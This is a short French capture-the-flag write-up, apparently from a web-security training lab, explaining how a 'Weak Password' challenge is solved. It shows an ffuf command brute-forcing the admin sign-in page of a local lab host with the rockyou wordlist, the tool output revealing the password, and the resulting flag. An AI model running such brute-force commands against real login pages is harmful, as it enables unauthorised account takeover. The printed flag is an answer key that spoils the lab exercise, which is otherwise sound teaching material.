# Weak Password

La DB s'appelle Member_Brute_Force on comprends donc qu'il faut bruteforce le mot de passe
```
└──╼ $ffuf -w ~/rockyou.txt:FUZZ -u 'http://192.168.56.104/?page=signin&username=admin&password=FUZZ&Login=Login#' -fw 80


        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v1.3.1 Kali Exclusive <3
________________________________________________

 :: Method           : GET
 :: URL              : http://192.168.56.104/?page=signin&username=admin&password=FUZZ&Login=Login#
 :: Wordlist         : FUZZ: /home/user/rockyou.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405
 :: Filter           : Response words: 80
________________________________________________

shadow                  [Status: 200, Size: 2088, Words: 87, Lines: 55]
```

en mettant entrant les login admin shadow on a le flag
```
The flag is : b3a6e43ddf8b4bbb4125e5e7d23040433827759d4de1c04ea63907479a80a6b2
```
